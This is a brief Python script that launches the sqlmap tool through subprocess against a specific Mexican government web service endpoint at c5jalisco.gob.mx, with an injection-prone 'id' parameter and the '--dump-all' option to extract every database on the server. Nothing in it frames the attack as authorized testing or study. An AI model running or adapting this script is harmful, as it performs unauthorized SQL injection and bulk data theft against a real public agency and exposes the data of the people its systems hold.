import subprocess

def execute_sqlmap_command():
    command = [      
        "sqlmap",
        "-u",
        "https://c5jalisco.gob.mx/ws/consultas.asmx/actualizacionInformacionExtraTransparencia?archivo=1&comentario=1&fecha=1&id=%5C&idPadre=1",
        "--dump-all"
    ]
    
    subprocess.run(command)
